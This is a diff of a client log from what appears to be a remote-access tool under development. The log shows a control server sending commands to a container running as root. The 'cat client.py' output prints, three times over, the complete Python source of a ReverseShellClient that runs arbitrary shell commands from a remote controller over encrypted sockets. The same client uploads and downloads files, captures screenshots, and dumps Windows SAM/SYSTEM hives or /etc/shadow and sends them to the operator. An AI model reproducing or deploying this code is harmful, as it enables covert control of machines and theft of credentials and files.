@@ -1,108 +1,650 @@
-2024-06-28 18:26:05,939 - INFO - Attempting to connect to server...
-2024-06-28 18:26:05,939 - INFO - Connected to server
-2024-06-28 18:26:05,939 - INFO - Sent client info: adc98f0cc4ea|Linux
-2024-06-28 18:26:08,340 - INFO - Received command: ipconfig
-2024-06-28 18:26:08,340 - INFO - Handling ipconfig
-2024-06-28 18:26:08,342 - INFO - Command output: 172.17.0.5
+2024-06-29 13:14:54,934 - INFO - Attempting to connect to server...
+2024-06-29 13:14:54,934 - INFO - Connected to server
+2024-06-29 13:14:54,936 - INFO - Sent client info: adc98f0cc4ea|Linux
+2024-06-29 13:14:57,468 - INFO - Received command: ipconfig
+2024-06-29 13:14:57,469 - INFO - Handling ipconfig
+2024-06-29 13:14:57,472 - INFO - Command output: 172.17.0.5
 
-2024-06-28 18:26:08,342 - INFO - ipconfig result: 172.17.0.5
+2024-06-29 13:14:57,472 - INFO - ipconfig result: 172.17.0.5
 
-2024-06-28 18:26:08,342 - INFO - ipconfig handled successfully
-2024-06-28 18:27:13,327 - INFO - Connection closed
-2024-06-28 18:27:15,504 - INFO - Attempting to connect to server...
-2024-06-28 18:27:15,504 - INFO - Connected to server
-2024-06-28 18:27:15,504 - INFO - Sent client info: adc98f0cc4ea|Linux
-2024-06-28 18:27:17,667 - INFO - Received command: ipconfig
-2024-06-28 18:27:17,667 - INFO - Handling ipconfig
-2024-06-28 18:27:17,669 - INFO - Command output: 172.17.0.5
+2024-06-29 13:14:57,472 - INFO - ipconfig handled successfully
+2024-06-29 13:31:26,435 - INFO - Connection closed
+2024-06-29 13:31:28,875 - INFO - Attempting to connect to server...
+2024-06-29 13:31:28,875 - INFO - Connected to server
+2024-06-29 13:31:28,877 - INFO - Sent client info: adc98f0cc4ea|Linux
+2024-06-29 13:31:33,825 - INFO - Received command: ls
+2024-06-29 13:31:33,825 - INFO - Executing command: ls
+2024-06-29 13:31:33,826 - INFO - Command output: __pycache__
+aes_crypt.py
+client.log
+client.py
+clientfinal.py
+clientscreen.py
+requirements.txt
+test.txt
 
-2024-06-28 18:27:17,669 - INFO - ipconfig result: 172.17.0.5
+2024-06-29 13:31:38,263 - INFO - Received command: uptime
+2024-06-29 13:31:38,263 - INFO - Executing command: uptime
+2024-06-29 13:31:38,269 - ERROR - Command error: /bin/sh: 1: uptime: not found
 
-2024-06-28 18:27:17,669 - INFO - ipconfig handled successfully
-2024-06-28 18:28:12,527 - INFO - Connection closed
-2024-06-28 18:28:14,967 - INFO - Attempting to connect to server...
-2024-06-28 18:28:14,967 - INFO - Connected to server
-2024-06-28 18:28:14,967 - INFO - Sent client info: adc98f0cc4ea|Linux
-2024-06-28 18:28:18,545 - INFO - Received command: ipconfig
-2024-06-28 18:28:18,545 - INFO - Handling ipconfig
-2024-06-28 18:28:18,546 - INFO - Command output: 172.17.0.5
+2024-06-29 13:31:50,015 - INFO - Received command: date
+2024-06-29 13:31:50,016 - INFO - Executing command: date
+2024-06-29 13:31:50,017 - INFO - Command output: Sat Jun 29 13:31:50 UTC 2024
 
-2024-06-28 18:28:18,547 - INFO - ipconfig result: 172.17.0.5
+2024-06-29 13:32:03,078 - INFO - Received command: ls
+2024-06-29 13:32:03,078 - INFO - Executing command: ls
+2024-06-29 13:32:03,079 - INFO - Command output: __pycache__
+aes_crypt.py
+client.log
+client.py
+clientfinal.py
+clientscreen.py
+requirements.txt
+test.txt
 
-2024-06-28 18:28:18,547 - INFO - ipconfig handled successfully
-2024-06-28 18:28:18,547 - INFO - Connection closed
-2024-06-28 18:28:18,547 - INFO - Attempting to connect to server...
-2024-06-28 18:28:18,547 - INFO - Connected to server
-2024-06-28 18:28:18,547 - INFO - Sent client info: adc98f0cc4ea|Linux
-2024-06-28 18:28:51,516 - INFO - Connection closed
-2024-06-28 18:28:51,516 - INFO - Attempting to connect to server...
-2024-06-28 18:28:51,516 - ERROR - Connection error: [Errno 111] Connection refused
-2024-06-28 18:28:54,647 - INFO - Attempting to connect to server...
-2024-06-28 18:28:54,647 - INFO - Connected to server
-2024-06-28 18:28:54,647 - INFO - Sent client info: adc98f0cc4ea|Linux
-2024-06-28 18:28:57,158 - INFO - Received command: ipconfig
-2024-06-28 18:28:57,158 - INFO - Handling ipconfig
-2024-06-28 18:28:57,159 - INFO - Command output: 172.17.0.5
+2024-06-29 13:32:05,346 - INFO - Received command: whoami
+2024-06-29 13:32:05,346 - INFO - Executing command: whoami
+2024-06-29 13:32:05,349 - INFO - Command output: root
 
-2024-06-28 18:28:57,160 - INFO - ipconfig result: 172.17.0.5
+2024-06-29 13:32:11,077 - INFO - Received command: cat client.py
+2024-06-29 13:32:11,077 - INFO - Executing command: cat client.py
+2024-06-29 13:32:11,079 - INFO - Command output: import socket
+import subprocess
+import os
+import sys
+from aes_crypt import AESCipher
+from time import sleep
+from base64 import b64encode, b64decode
+from PIL import ImageGrab
+import platform
+import datetime
 
-2024-06-28 18:28:57,160 - INFO - ipconfig handled successfully
-2024-06-28 18:30:29,461 - INFO - Connection closed
-2024-06-28 18:30:31,569 - INFO - Attempting to connect to server...
-2024-06-28 18:30:31,569 - INFO - Connected to server
-2024-06-28 18:30:31,570 - INFO - Sent client info: adc98f0cc4ea|Linux
-2024-06-28 18:30:33,633 - INFO - Received command: ipconfig
-2024-06-28 18:30:33,633 - INFO - Handling ipconfig
-2024-06-28 18:30:33,635 - INFO - Command output: 172.17.0.5
 
-2024-06-28 18:30:33,635 - INFO - ipconfig result: 172.17.0.5
+class ReverseShellClient:
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        self.conn = None
 
-2024-06-28 18:30:33,635 - INFO - ipconfig handled successfully
-2024-06-28 18:30:50,217 - INFO - Connection closed
-2024-06-28 18:30:50,217 - INFO - Attempting to connect to server...
-2024-06-28 18:30:50,217 - ERROR - Connection error: [Errno 111] Connection refused
-2024-06-28 18:30:54,196 - INFO - Attempting to connect to server...
-2024-06-28 18:30:54,196 - INFO - Connected to server
-2024-06-28 18:30:54,196 - INFO - Sent client info: adc98f0cc4ea|Linux
-2024-06-28 18:30:57,360 - INFO - Received command: ipconfig
-2024-06-28 18:30:57,360 - INFO - Handling ipconfig
-2024-06-28 18:30:57,361 - INFO - Command output: 172.17.0.5
+    def start(self):
+        while True:
+            try:
+                self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.conn.connect((self.host, self.port))
+                self.send_client_info()
+                self.listen_for_commands()
+            except Exception as e:
+                print(f"Connection error: {e}")
+                sleep(10)
 
-2024-06-28 18:30:57,361 - INFO - ipconfig result: 172.17.0.5
+    def send_client_info(self):
+        try:
+            hostname = socket.gethostname()
+            os_type = platform.system()
+            client_info = f"{hostname}|{os_type}"
+            self.send_large_data(client_info)
+        except Exception as e:
+            print(f"Failed to send client info: {e}")
 
-2024-06-28 18:30:57,362 - INFO - ipconfig handled successfully
-2024-06-28 18:31:27,224 - INFO - Connection closed
-2024-06-28 18:31:27,224 - INFO - Attempting to connect to server...
-2024-06-28 18:31:27,224 - ERROR - Connection error: [Errno 111] Connection refused
-2024-06-28 18:31:30,421 - INFO - Attempting to connect to server...
-2024-06-28 18:31:30,421 - INFO - Connected to server
-2024-06-28 18:31:30,422 - INFO - Sent client info: adc98f0cc4ea|Linux
-2024-06-28 18:31:33,144 - INFO - Received command: ipconfig
-2024-06-28 18:31:33,144 - INFO - Handling ipconfig
-2024-06-28 18:31:33,145 - INFO - Command output: 172.17.0.5
+    def listen_for_commands(self):
+        try:
+            while True:
+                data = self.conn.recv(4096).decode("utf-8")
+                if not data:
+                    break
+                decrypted_data = AESCipher.decrypt(data)
+                if decrypted_data.lower() == "exit":
+                    break
+                elif decrypted_data.startswith("download"):
+                    self.handle_download(decrypted_data)
+                elif decrypted_data.startswith("upload"):
+                    self.handle_upload(decrypted_data)
+                elif decrypted_data.startswith("search"):
+                    self.handle_search(decrypted_data)
+                elif decrypted_data.startswith("hashdump"):
+                    self.handle_hashdump()
+                elif decrypted_data.startswith("screenshot"):
+                    self.handle_screenshot()
+                else:
+                    self.execute_command(decrypted_data)
+        finally:
+            self.conn.close()
 
-2024-06-28 18:31:33,145 - INFO - ipconfig result: 172.17.0.5
+    def handle_download(self, command):
+        file_path = command.split(" ", 1)[1]
+        try:
+            with open(file_path, "rb") as f:
+                while True:
+                    chunk = f.read(4096)
+                    if not chunk:
+                        break
+                    self.conn.send(
+                        AESCipher.encrypt(b64encode(chunk).decode("utf-8")).encode(
+                            "utf-8"
+                        )
+                    )
+            self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
+        except Exception as e:
+            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))
 
-2024-06-28 18:31:33,145 - INFO - ipconfig handled successfully
-2024-06-28 18:31:50,543 - INFO - Connection closed
-2024-06-28 18:31:52,530 - INFO - Attempting to connect to server...
-2024-06-28 18:31:52,530 - INFO - Connected to server
-2024-06-28 18:31:52,530 - INFO - Sent client info: adc98f0cc4ea|Linux
-2024-06-28 18:31:54,576 - INFO - Received command: ipconfig
-2024-06-28 18:31:54,576 - INFO - Handling ipconfig
-2024-06-28 18:31:54,577 - INFO - Command output: 172.17.0.5
+    def handle_upload(self, command):
+        parts = command.split(" ", 2)
+        file_path = parts[1]
+        buffer_size = int(parts[2])
 
-2024-06-28 18:31:54,578 - INFO - ipconfig result: 172.17.0.5
+        try:
+            with open(file_path, "wb") as f:
+                while True:
+                    data = self.conn.recv(buffer_size).decode("utf-8")
+                    decrypted_data = AESCipher.decrypt(data)
+                    if decrypted_data == "EOF":
+                        break
+                    f.write(b64decode(decrypted_data))
+            print(f"File {file_path} uploaded successfully.")
+        except Exception as e:
+            print(f"Failed to upload {file_path}: {e}")
+            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))
 
-2024-06-28 18:31:54,578 - INFO - ipconfig handled successfully
-2024-06-28 18:32:39,710 - INFO - Connection closed
-2024-06-28 18:32:42,522 - INFO - Attempting to connect to server...
-2024-06-28 18:32:42,522 - INFO - Connected to server
-2024-06-28 18:32:42,523 - INFO - Sent client info: adc98f0cc4ea|Linux
-2024-06-28 18:32:46,090 - INFO - Received command: ipconfig
-2024-06-28 18:32:46,090 - INFO - Handling ipconfig
-2024-06-28 18:32:46,091 - INFO - Command output: 172.17.0.5
+    def handle_search(self, command):
+        file_name = command.split(" ", 1)[1]
+        if os.name == "nt":
+            command = f"dir /s /b {file_name}"
+        else:
+            command = f"find / -name {file_name} 2>/dev/null"
+        result = self.run_system_command(command)
+        self.send_large_data(result)
 
-2024-06-28 18:32:46,091 - INFO - ipconfig result: 172.17.0.5
+    def handle_hashdump(self):
+        if os.name == "nt":
+            commands = [
+                "reg save hklm\\sam C:\\Windows\\Temp\\sam && reg save hklm\\system C:\\Windows\\Temp\\system && reg save hklm\\security C:\\Windows\\Temp\\security",
+                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\sam'))\"",
+                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\system'))\"",
+                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\security'))\"",
+            ]
+            result = ""
+            for cmd in commands:
+                result += self.run_system_command(cmd) + "\n"
+        else:
+            try:
+                result = self.run_system_command(
+                    "sudo cat /etc/shadow || cat /etc/shadow"
+                )
+            except subprocess.CalledProcessError as e:
+                result = f"Error: {e.output.decode('utf-8')}"
+            except Exception as e:
+                result = str(e)
+        self.send_large_data(result)
 
-2024-06-28 18:32:46,091 - INFO - ipconfig handled successfully
+    def handle_screenshot(self):
+        try:
+            timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
+            file_name = f"screenshot_{timestamp}.png"
+            screenshot = ImageGrab.grab()
+            screenshot.save(file_name)
+            self.send_file(file_name)
+            os.remove(file_name)  # Clean up the screenshot file after sending
+        except Exception as e:
+            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))
+
+    def send_file(self, file_path):
+        try:
+            with open(file_path, "rb") as f:
+                while True:
+                    chunk = f.read(4096)
+                    if not chunk:
+                        break
+                    self.conn.send(
+                        AESCipher.encrypt(b64encode(chunk).decode("utf-8")).encode(
+                            "utf-8"
+                        )
+                    )
+            self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
+        except Exception as e:
+            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))
+
+    def execute_command(self, command):
+        try:
+            result = self.run_system_command(command)
+        except Exception as e:
+            result = str(e)
+        self.send_large_data(result)
+
+    def send_large_data(self, data):
+        chunks = [data[i : i + 1024] for i in range(0, len(data), 1024)]
+        for chunk in chunks:
+            self.conn.send(AESCipher.encrypt(chunk).encode("utf-8"))
+        self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
+
+    def run_system_command(self, command):
+        try:
+            output = subprocess.check_output(
+                command, shell=True, stderr=subprocess.STDOUT
+            )
+            return output.decode("utf-8")
+        except subprocess.CalledProcessError as e:
+            return str(e)
+
+    def take_screenshot(self):
+        timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
+        file_name = f"screenshot_{timestamp}.png"
+        screenshot = ImageGrab.grab()
+        screenshot.save(file_name)
+        with open(file_name, "rb") as f:
+            return b64encode(f.read()).decode("utf-8")
+
+
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print("Usage: python reverse_shell.py <HOST> <PORT>")
+        sys.exit(1)
+
+    host = sys.argv[1]
+    port = int(sys.argv[2])
+    client = ReverseShellClient(host, port)
+    client.start()
+
+2024-06-29 13:34:16,405 - INFO - Connection closed
+2024-06-29 13:34:18,676 - INFO - Attempting to connect to server...
+2024-06-29 13:34:18,676 - INFO - Connected to server
+2024-06-29 13:34:18,677 - INFO - Sent client info: adc98f0cc4ea|Linux
+2024-06-29 13:34:23,775 - INFO - Received command: cat client.py
+2024-06-29 13:34:23,775 - INFO - Executing command: cat client.py
+2024-06-29 13:34:23,776 - INFO - Command output: import socket
+import subprocess
+import os
+import sys
+from aes_crypt import AESCipher
+from time import sleep
+from base64 import b64encode, b64decode
+from PIL import ImageGrab
+import platform
+import datetime
+
+
+class ReverseShellClient:
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        self.conn = None
+
+    def start(self):
+        while True:
+            try:
+                self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.conn.connect((self.host, self.port))
+                self.send_client_info()
+                self.listen_for_commands()
+            except Exception as e:
+                print(f"Connection error: {e}")
+                sleep(10)
+
+    def send_client_info(self):
+        try:
+            hostname = socket.gethostname()
+            os_type = platform.system()
+            client_info = f"{hostname}|{os_type}"
+            self.send_large_data(client_info)
+        except Exception as e:
+            print(f"Failed to send client info: {e}")
+
+    def listen_for_commands(self):
+        try:
+            while True:
+                data = self.conn.recv(4096).decode("utf-8")
+                if not data:
+                    break
+                decrypted_data = AESCipher.decrypt(data)
+                if decrypted_data.lower() == "exit":
+                    break
+                elif decrypted_data.startswith("download"):
+                    self.handle_download(decrypted_data)
+                elif decrypted_data.startswith("upload"):
+                    self.handle_upload(decrypted_data)
+                elif decrypted_data.startswith("search"):
+                    self.handle_search(decrypted_data)
+                elif decrypted_data.startswith("hashdump"):
+                    self.handle_hashdump()
+                elif decrypted_data.startswith("screenshot"):
+                    self.handle_screenshot()
+                else:
+                    self.execute_command(decrypted_data)
+        finally:
+            self.conn.close()
+
+    def handle_download(self, command):
+        file_path = command.split(" ", 1)[1]
+        try:
+            with open(file_path, "rb") as f:
+                while True:
+                    chunk = f.read(4096)
+                    if not chunk:
+                        break
+                    self.conn.send(
+                        AESCipher.encrypt(b64encode(chunk).decode("utf-8")).encode(
+                            "utf-8"
+                        )
+                    )
+            self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
+        except Exception as e:
+            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))
+
+    def handle_upload(self, command):
+        parts = command.split(" ", 2)
+        file_path = parts[1]
+        buffer_size = int(parts[2])
+
+        try:
+            with open(file_path, "wb") as f:
+                while True:
+                    data = self.conn.recv(buffer_size).decode("utf-8")
+                    decrypted_data = AESCipher.decrypt(data)
+                    if decrypted_data == "EOF":
+                        break
+                    f.write(b64decode(decrypted_data))
+            print(f"File {file_path} uploaded successfully.")
+        except Exception as e:
+            print(f"Failed to upload {file_path}: {e}")
+            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))
+
+    def handle_search(self, command):
+        file_name = command.split(" ", 1)[1]
+        if os.name == "nt":
+            command = f"dir /s /b {file_name}"
+        else:
+            command = f"find / -name {file_name} 2>/dev/null"
+        result = self.run_system_command(command)
+        self.send_large_data(result)
+
+    def handle_hashdump(self):
+        if os.name == "nt":
+            commands = [
+                "reg save hklm\\sam C:\\Windows\\Temp\\sam && reg save hklm\\system C:\\Windows\\Temp\\system && reg save hklm\\security C:\\Windows\\Temp\\security",
+                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\sam'))\"",
+                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\system'))\"",
+                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\security'))\"",
+            ]
+            result = ""
+            for cmd in commands:
+                result += self.run_system_command(cmd) + "\n"
+        else:
+            try:
+                result = self.run_system_command(
+                    "sudo cat /etc/shadow || cat /etc/shadow"
+                )
+            except subprocess.CalledProcessError as e:
+                result = f"Error: {e.output.decode('utf-8')}"
+            except Exception as e:
+                result = str(e)
+        self.send_large_data(result)
+
+    def handle_screenshot(self):
+        try:
+            timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
+            file_name = f"screenshot_{timestamp}.png"
+            screenshot = ImageGrab.grab()
+            screenshot.save(file_name)
+            self.send_file(file_name)
+            os.remove(file_name)  # Clean up the screenshot file after sending
+        except Exception as e:
+            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))
+
+    def send_file(self, file_path):
+        try:
+            with open(file_path, "rb") as f:
+                while True:
+                    chunk = f.read(4096)
+                    if not chunk:
+                        break
+                    self.conn.send(
+                        AESCipher.encrypt(b64encode(chunk).decode("utf-8")).encode(
+                            "utf-8"
+                        )
+                    )
+            self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
+        except Exception as e:
+            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))
+
+    def execute_command(self, command):
+        try:
+            result = self.run_system_command(command)
+        except Exception as e:
+            result = str(e)
+        self.send_large_data(result)
+
+    def send_large_data(self, data):
+        chunks = [data[i : i + 1024] for i in range(0, len(data), 1024)]
+        for chunk in chunks:
+            self.conn.send(AESCipher.encrypt(chunk).encode("utf-8"))
+        self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
+
+    def run_system_command(self, command):
+        try:
+            output = subprocess.check_output(
+                command, shell=True, stderr=subprocess.STDOUT
+            )
+            return output.decode("utf-8")
+        except subprocess.CalledProcessError as e:
+            return str(e)
+
+    def take_screenshot(self):
+        timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
+        file_name = f"screenshot_{timestamp}.png"
+        screenshot = ImageGrab.grab()
+        screenshot.save(file_name)
+        with open(file_name, "rb") as f:
+            return b64encode(f.read()).decode("utf-8")
+
+
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print("Usage: python reverse_shell.py <HOST> <PORT>")
+        sys.exit(1)
+
+    host = sys.argv[1]
+    port = int(sys.argv[2])
+    client = ReverseShellClient(host, port)
+    client.start()
+
+2024-06-29 13:35:02,362 - INFO - Connection closed
+2024-06-29 13:35:04,653 - INFO - Attempting to connect to server...
+2024-06-29 13:35:04,653 - INFO - Connected to server
+2024-06-29 13:35:04,654 - INFO - Sent client info: adc98f0cc4ea|Linux
+2024-06-29 13:35:09,858 - INFO - Received command: cat client.py
+2024-06-29 13:35:09,858 - INFO - Executing command: cat client.py
+2024-06-29 13:35:09,859 - INFO - Command output: import socket
+import subprocess
+import os
+import sys
+from aes_crypt import AESCipher
+from time import sleep
+from base64 import b64encode, b64decode
+from PIL import ImageGrab
+import platform
+import datetime
+
+
+class ReverseShellClient:
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        self.conn = None
+
+    def start(self):
+        while True:
+            try:
+                self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.conn.connect((self.host, self.port))
+                self.send_client_info()
+                self.listen_for_commands()
+            except Exception as e:
+                print(f"Connection error: {e}")
+                sleep(10)
+
+    def send_client_info(self):
+        try:
+            hostname = socket.gethostname()
+            os_type = platform.system()
+            client_info = f"{hostname}|{os_type}"
+            self.send_large_data(client_info)
+        except Exception as e:
+            print(f"Failed to send client info: {e}")
+
+    def listen_for_commands(self):
+        try:
+            while True:
+                data = self.conn.recv(4096).decode("utf-8")
+                if not data:
+                    break
+                decrypted_data = AESCipher.decrypt(data)
+                if decrypted_data.lower() == "exit":
+                    break
+                elif decrypted_data.startswith("download"):
+                    self.handle_download(decrypted_data)
+                elif decrypted_data.startswith("upload"):
+                    self.handle_upload(decrypted_data)
+                elif decrypted_data.startswith("search"):
+                    self.handle_search(decrypted_data)
+                elif decrypted_data.startswith("hashdump"):
+                    self.handle_hashdump()
+                elif decrypted_data.startswith("screenshot"):
+                    self.handle_screenshot()
+                else:
+                    self.execute_command(decrypted_data)
+        finally:
+            self.conn.close()
+
+    def handle_download(self, command):
+        file_path = command.split(" ", 1)[1]
+        try:
+            with open(file_path, "rb") as f:
+                while True:
+                    chunk = f.read(4096)
+                    if not chunk:
+                        break
+                    self.conn.send(
+                        AESCipher.encrypt(b64encode(chunk).decode("utf-8")).encode(
+                            "utf-8"
+                        )
+                    )
+            self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
+        except Exception as e:
+            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))
+
+    def handle_upload(self, command):
+        parts = command.split(" ", 2)
+        file_path = parts[1]
+        buffer_size = int(parts[2])
+
+        try:
+            with open(file_path, "wb") as f:
+                while True:
+                    data = self.conn.recv(buffer_size).decode("utf-8")
+                    decrypted_data = AESCipher.decrypt(data)
+                    if decrypted_data == "EOF":
+                        break
+                    f.write(b64decode(decrypted_data))
+            print(f"File {file_path} uploaded successfully.")
+        except Exception as e:
+            print(f"Failed to upload {file_path}: {e}")
+            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))
+
+    def handle_search(self, command):
+        file_name = command.split(" ", 1)[1]
+        if os.name == "nt":
+            command = f"dir /s /b {file_name}"
+        else:
+            command = f"find / -name {file_name} 2>/dev/null"
+        result = self.run_system_command(command)
+        self.send_large_data(result)
+
+    def handle_hashdump(self):
+        if os.name == "nt":
+            commands = [
+                "reg save hklm\\sam C:\\Windows\\Temp\\sam && reg save hklm\\system C:\\Windows\\Temp\\system && reg save hklm\\security C:\\Windows\\Temp\\security",
+                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\sam'))\"",
+                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\system'))\"",
+                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\security'))\"",
+            ]
+            result = ""
+            for cmd in commands:
+                result += self.run_system_command(cmd) + "\n"
+        else:
+            try:
+                result = self.run_system_command(
+                    "sudo cat /etc/shadow || cat /etc/shadow"
+                )
+            except subprocess.CalledProcessError as e:
+                result = f"Error: {e.output.decode('utf-8')}"
+            except Exception as e:
+                result = str(e)
+        self.send_large_data(result)
+
+    def handle_screenshot(self):
+        try:
+            timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
+            file_name = f"screenshot_{timestamp}.png"
+            screenshot = ImageGrab.grab()
+            screenshot.save(file_name)
+            self.send_file(file_name)
+            os.remove(file_name)  # Clean up the screenshot file after sending
+        except Exception as e:
+            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))
+
+    def send_file(self, file_path):
+        try:
+            with open(file_path, "rb") as f:
+                while True:
+                    chunk = f.read(4096)
+                    if not chunk:
+                        break
+                    self.conn.send(
+                        AESCipher.encrypt(b64encode(chunk).decode("utf-8")).encode(
+                            "utf-8"
+                        )
+                    )
+            self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
+        except Exception as e:
+            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))
+
+    def execute_command(self, command):
+        try:
+            result = self.run_system_command(command)
+        except Exception as e:
+            result = str(e)
+        self.send_large_data(result)
+
+    def send_large_data(self, data):
+        chunks = [data[i : i + 1024] for i in range(0, len(data), 1024)]
+        for chunk in chunks:
+            self.conn.send(AESCipher.encrypt(chunk).encode("utf-8"))
+        self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
+
+    def run_system_command(self, command):
+        try:
+            output = subprocess.check_output(
+                command, shell=True, stderr=subprocess.STDOUT
+            )
+            return output.decode("utf-8")
+        except subprocess.CalledProcessError as e:
+            return str(e)
+
+    def take_screenshot(self):
+        timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
+        file_name = f"screenshot_{timestamp}.png"
+        screenshot = ImageGrab.grab()
+        screenshot.save(file_name)
+        with open(file_name, "rb") as f:
+            return b64encode(f.read()).decode("utf-8")
+
+
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print("Usage: python reverse_shell.py <HOST> <PORT>")
+        sys.exit(1)
+
+    host = sys.argv[1]
+    port = int(sys.argv[2])
+    client = ReverseShellClient(host, port)
+    client.start()
+
